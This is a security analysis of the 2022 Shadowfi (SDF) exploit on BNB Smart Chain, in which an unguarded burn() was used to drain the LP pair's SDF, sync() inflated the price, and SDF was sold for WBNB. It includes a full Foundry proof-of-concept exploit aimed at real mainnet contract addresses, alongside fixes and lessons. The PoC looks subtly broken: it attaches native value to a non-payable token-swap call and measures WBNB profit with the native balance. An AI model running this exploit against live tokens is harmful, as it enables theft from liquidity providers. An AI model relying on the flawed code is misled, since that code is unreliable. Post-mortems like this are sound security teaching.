# Shadowfi (SDF) — burn()-Based Reserve Manipulation Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-09 |
| **Protocol** | Shadowfi (SDF Token) |
| **Chain** | Binance Smart Chain (BSC) |
| **Loss** | Unconfirmed |
| **SDF Token** | [0x10bc28d2810dD462E16facfF18f78783e859351b](https://bscscan.com/address/0x10bc28d2810dD462E16facfF18f78783e859351b) |
| **SDF/WBNB Pair** | [0xF9e3151e813cd6729D52d9A0C3ee69F22CcE650A](https://bscscan.com/address/0xF9e3151e813cd6729D52d9A0C3ee69F22CcE650A) |
| **PancakeRouter** | [0x10ED43C718714eb63d5aA57B78B54704E256024E](https://bscscan.com/address/0x10ED43C718714eb63d5aA57B78B54704E256024E) |
| **WBNB** | [0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c](https://bscscan.com/address/0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c) |
| **Root Cause** | Directly `burn()`ing SDF from the LP pair to reduce reserves, then calling `sync()` to inflate the price |
| **CWE** | CWE-840: Business Logic Error |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-09/Shadowfi_exp.sol) |

---
## 1. Vulnerability Overview

The Shadowfi (SDF) token publicly exposed its `burn()` function, allowing anyone to burn tokens from any arbitrary address. The attacker purchased a small amount of SDF with WBNB, then mass-burned the SDF tokens held by the SDF/WBNB LP pair. They subsequently called `pair.sync()` to reflect the reduced SDF balance into the reserves. With the pair's SDF reserve sharply depleted, the SDF unit price spiked, allowing the attacker to sell their held SDF at the inflated price and realize a WBNB profit.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable SDF token — anyone can burn tokens from any arbitrary address
contract SDFToken is ERC20 {
    // ❌ The from parameter has no validation — tokens can be burned from the pair address
    function burn(address from, uint256 amount) external {
        // ❌ Does not check whether msg.sender == from or has sufficient allowance
        _burn(from, amount);
    }
}

// Result: pair.balanceOf(SDF) < pair.reserve(SDF)
// When pair.sync() is called, the reserve is updated to the reduced balance
// → SDF unit price rises (WBNB reserve unchanged, SDF reserve decreased)

// ✅ Correct burn pattern
contract SafeSDFToken is ERC20 {
    // ✅ Only the caller's own tokens can be burned
    function burn(uint256 amount) external {
        _burn(msg.sender, amount);
    }

    // ✅ Allowance-based burning of another account's tokens
    function burnFrom(address account, uint256 amount) external {
        uint256 currentAllowance = allowance(account, msg.sender);
        require(currentAllowance >= amount, "ERC20: burn exceeds allowance");
        _approve(account, msg.sender, currentAllowance - amount);
        _burn(account, amount);
    }
}
```

---
### On-Chain Original Code

Source: Sourcify verified


**ShadowFi.sol** — Entry point:
```solidity
// ❌ Root cause: directly burn()ing SDF from the LP pair to reduce reserves, then calling sync() to inflate the price
    function burn(address account, uint256 _amount) public {
        _transferFrom(account, DEAD, _amount);  // ❌ Unauthorized transferFrom

        emit burnTokens(account, _amount);
    }
```

**Shadowfi_decompiled.sol** — Related contract:
```solidity
// ❌ Root cause: directly burn()ing SDF from the LP pair to reduce reserves, then calling sync() to inflate the price
    function burn(address arg0, uint256 arg1) external {}  // 0x9dc29fac  // ❌ Vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] 0.01 WBNB → SDF swap (small purchase)
    │       (via PancakeRouter)
    │
    ├─[2] Mass-burn SDF held by the SDF/WBNB pair
    │       sdf.burn(address(pair), pair.SDF_balance * 90%)
    │       ❌ from = pair address, no access control
    │       → pair.SDF_balance reduced by 90%
    │
    ├─[3] Call pair.sync()
    │       └─ reserve0(SDF) = pair.balanceOf(SDF) (reduced value)
    │           reserve1(WBNB) = unchanged
    │           → SDF price increases ~10x
    │
    ├─[4] Held SDF → WBNB reverse swap
    │       swapExactTokensForTokensSupportingFeeOnTransferTokens()
    │       → WBNB obtained at the inflated SDF price
    │
    └─[5] Net profit: WBNB (amount unconfirmed)
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface ISDF {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    // ❌ Anyone can burn tokens from any arbitrary address
    function burn(address from, uint256 amount) external;
}

interface IPair {
    function sync() external;
    function getReserves() external view returns (uint112, uint112, uint32);
}

interface IRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn, uint256 amountOutMin,
        address[] calldata path, address to, uint256 deadline
    ) external;
}

contract ShadowfiExploit is Test {
    ISDF sdf     = ISDF(0x10bc28d2810dD462E16facfF18f78783e859351b);
    IPair pair   = IPair(0xF9e3151e813cd6729D52d9A0C3ee69F22CcE650A);
    IRouter router = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;

    function setUp() public {
        vm.createSelectFork("bsc", 20_969_095);
        vm.deal(address(this), 0.01 ether);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] WBNB balance", address(this).balance, 18);

        // [Step 1] WBNB → SDF small purchase
        address[] memory path = new address[](2);
        path[0] = WBNB;
        path[1] = address(sdf);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens{value: 0.01 ether}(
            0.01 ether, 0, path, address(this), block.timestamp
        );

        emit log_named_decimal_uint("[After SDF purchase] SDF balance", sdf.balanceOf(address(this)), 18);

        // [Step 2] Mass-burn SDF from the LP pair
        // ⚡ burn(pair, amount): from = pair, no access control
        uint256 pairSdfBalance = sdf.balanceOf(address(pair));
        sdf.burn(address(pair), pairSdfBalance * 9 / 10);

        // [Step 3] Call sync() to update reserve to the reduced balance
        pair.sync();

        (uint112 r0, uint112 r1, ) = pair.getReserves();
        emit log_named_uint("[After sync] SDF reserve", r0);
        emit log_named_uint("[After sync] WBNB reserve", r1);
        // SDF price = WBNB reserve / SDF reserve → spikes

        // [Step 4] Held SDF → WBNB reverse swap (sell at inflated price)
        sdf.approve(address(router), type(uint256).max);
        address[] memory revPath = new address[](2);
        revPath[0] = address(sdf);
        revPath[1] = WBNB;
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            sdf.balanceOf(address(this)), 0, revPath, address(this), block.timestamp
        );

        emit log_named_decimal_uint("[End] WBNB balance", address(this).balance, 18);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Arbitrary address burn() + sync() price manipulation |
| **CWE** | CWE-840: Business Logic Error |
| **OWASP DeFi** | AMM reserve manipulation |
| **Attack Vector** | `burn(pair, amount)` → `pair.sync()` → sell at inflated price |
| **Precondition** | No `from` address validation in `burn()` function |
| **Impact** | WBNB stolen (amount unconfirmed) |

---
## 6. Remediation Recommendations

1. **Protect the `burn()` function**: Only allow burning of the caller's own tokens (`burn(amount)`), or use the `burnFrom()` pattern that requires allowance verification when burning another account's tokens.
2. **Block LP address burning**: Reject transactions where the `from` parameter in `burn()` is a Uniswap/PancakeSwap LP pair address.
3. **Use OpenZeppelin ERC20Burnable**: Using the `burnFrom()` implementation from a battle-tested library automatically includes allowance validation.

```solidity
// ✅ Safe burn based on OpenZeppelin
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol";

contract SafeSDF is ERC20Burnable {
    // burn(amount): burns only msg.sender's tokens (automatically protected)
    // burnFrom(account, amount): verifies allowance before burning (automatically protected)
    // Direct burning from an arbitrary address is not possible
}
```

---
## 7. Lessons Learned

- **The `from` parameter in `burn()` functions**: When a burn function accepts a `from` address as a parameter, it must enforce either `msg.sender == from` or an allowance check. Omitting this creates a critical vulnerability that allows burning tokens from any address, including LP pools.
- **burn + sync pattern**: The pattern of burning tokens from an LP pair and calling `sync()` is a repeatedly exploited attack technique seen in XST, Shadowfi, and others. Any token with a publicly accessible burn function that provides liquidity to an AMM must be carefully reviewed for this risk.
- **High returns from minimal capital**: With only 0.01 WBNB as the initial capital, the attacker manipulated the LP pair to realize a profit. The structural severity of the vulnerability matters far more than capital efficiency.